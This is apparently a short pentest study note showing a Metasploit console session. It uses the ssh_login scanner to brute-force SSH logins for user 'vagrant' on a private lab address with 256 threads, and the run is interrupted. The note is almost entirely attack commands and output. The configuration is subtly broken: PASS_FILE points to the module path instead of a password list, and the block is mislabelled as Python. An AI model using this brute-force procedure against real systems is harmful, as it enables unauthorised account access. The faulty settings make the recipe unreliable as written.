# Pre-requisite - [[SSH]]
- To search for default or guessable credentials, you can use the SSH Login Check Scanner auxiliary module to test SSH logins on a range of machines and report successful logins:
# Code - 
```python
msf6 auxiliary(scanner/ssh/ssh_version) > use  auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME vagrant
USERNAME => vagrant
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE  auxiliary/scanner/ssh/ssh_login 
PASS_FILE => auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.216.11
RHOSTS => 192.168.216.11
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 256
THREADS => 256
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.216.11:22 - Starting bruteforce
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
```